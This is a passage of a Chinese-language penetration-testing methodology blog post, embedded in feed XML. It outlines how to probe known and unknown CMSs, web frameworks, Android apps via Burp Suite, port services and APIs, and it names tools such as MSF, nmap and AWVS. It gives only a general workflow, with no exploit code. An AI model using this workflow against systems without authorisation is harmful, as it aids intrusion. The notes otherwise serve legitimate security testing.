title="2.1已知CMS"></a>2.1已知CMS</h2><p>如遇到常见的CMS，比如dedecms，discus，wordpress等源码结构，利用公开的漏洞进行测试，如不存在就需要采用白盒代码审计自行挖掘。（能识别二次开发的按已知CMS思路进行）</p><h2 id="2-2开发框架"><a href="#2-2开发框架" class="headerlink" title="2.2开发框架"></a>2.2开发框架</h2><p>如遇见常见的thinkphp，spring，flask等开发的源码程序，这种源码程序正常的安全测试思路：</p><pre><code>  1. 获取对应的开发框架信息：     1. 名字     1. 版本  2. 通过公开的框架类安全问题进行测试  3. 白盒代码审计进行挖掘</code></pre><h2 id="2-3未知CMS"><a href="#2-3未知CMS" class="headerlink" title="2.3未知CMS"></a>2.3未知CMS</h2><p>如果遇到常见的企业或个人内部程序源码，也可以是某CMS二次开发的源码结构，针对此类的源码程序测试思路：</p><ol><li>有源码进行代码审计</li><li>采用常规扫描工具或脚本进行探针</li><li>人工探针<ol><li>功能点</li><li>参数</li><li>盲猜</li></ol></li></ol><h1 id="3-APP应用"><a href="#3-APP应用" class="headerlink" title="3.APP应用"></a>3.APP应用</h1><h2 id="3-1抓包"><a href="#3-1抓包" class="headerlink" title="3.1抓包"></a>3.1抓包</h2><h3 id="3-1-1安卓模拟器-gt-Burpsuite"><a href="#3-1-1安卓模拟器-gt-Burpsuite" class="headerlink" title="3.1.1安卓模拟器-&gt;Burpsuite"></a>3.1.1安卓模拟器-&gt;Burpsuite</h3><p><img src="01_EnuBox_Mattermost.assets/1636294566446-5213fe4b-a93c-41fa-ae8f-a301afc38bdf-164588770623627.png" alt="image.png"></p><p><img src="01_EnuBox_Mattermost.assets/1636294594333-55af1af3-3020-4330-aee3-1a20424ba436-164588771623629.png" alt="image.png"></p><h3 id="3-1-2安卓模拟器-gt-Burpsuite联动扫描器"><a href="#3-1-2安卓模拟器-gt-Burpsuite联动扫描器" class="headerlink" title="3.1.2安卓模拟器-&gt;Burpsuite联动扫描器"></a>3.1.2安卓模拟器-&gt;Burpsuite联动扫描器</h3><p><img src="01_EnuBox_Mattermost.assets/1636294943207-f64ae85a-9456-408d-be72-e10376f5fc69-164600298591932.png" alt="image.png"></p><h2 id="3-2协议"><a href="#3-2协议" class="headerlink" title="3.2协议"></a>3.2协议</h2><h3 id="3-2-1WEB协议类"><a href="#3-2-1WEB协议类" class="headerlink" title="3.2.1WEB协议类"></a>3.2.1WEB协议类</h3><p>按照web应用</p><h3 id="3-2-2其他协议"><a href="#3-2-2其他协议" class="headerlink" title="3.2.2其他协议"></a>3.2.2其他协议</h3><h2 id="3-3逆向"><a href="#3-3逆向" class="headerlink" title="3.3逆向"></a>3.3逆向</h2><p>借助工具，漏了个大洞</p><h1 id="4-服务协议"><a href="#4-服务协议" class="headerlink" title="4.服务协议"></a>4.服务协议</h1><h2 id="4-1端口服务"><a href="#4-1端口服务" class="headerlink" title="4.1端口服务"></a>4.1端口服务</h2><p>根据前期信息收集，针对目标端口服务类探针后，进行安全测试，主要涉及的攻击方法：</p><ol><li>口令安全</li><li>web类漏洞</li><li>版本漏洞</li></ol><p>WEB<br>数据库<br>大数据<br>文件<br>远程访问<br>邮件<br>其他：DNS DHCP Docker等等</p><h2 id="4-2API接口"><a href="#4-2API接口" class="headerlink" title="4.2API接口"></a>4.2API接口</h2><p>根据应用自身的功能方向决定，安全测试目标需要有API接口调用才能进行此类测试，主要涉及的安全问题：<br>自身安全        配合WEB        业务漏洞等等<br>其中产生的危害可大可小，属于应用API接口网络服务测试面，一般也是存在接口调用的情况下的测试方案。</p><h1 id="5-其他"><a href="#5-其他" class="headerlink" title="5.其他"></a>5.其他</h1><h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h1><p>1.系统漏洞发现主要借助于MSF，nmap等扫描工具；<br>2.web漏洞主要借助目前市面上已知的exp<br>3.app可以先将网址抓到，然后再做渗透<br>4.wsdl接口服务将链接丢到awvs里面跑</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-操作系统&quot;&gt;&lt;a href=&quot;#1-操作系统&quot; class=&quot;headerlink&quot; title=&quot;1.操作系统&quot;&gt;&lt;/a&gt;1.操作系统&lt;/h1&gt;&lt;h2 id=&quot;1-1探针&quot;&gt;&lt;a href=&quot;#1-1探针&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
  </entry>
  
</feed>
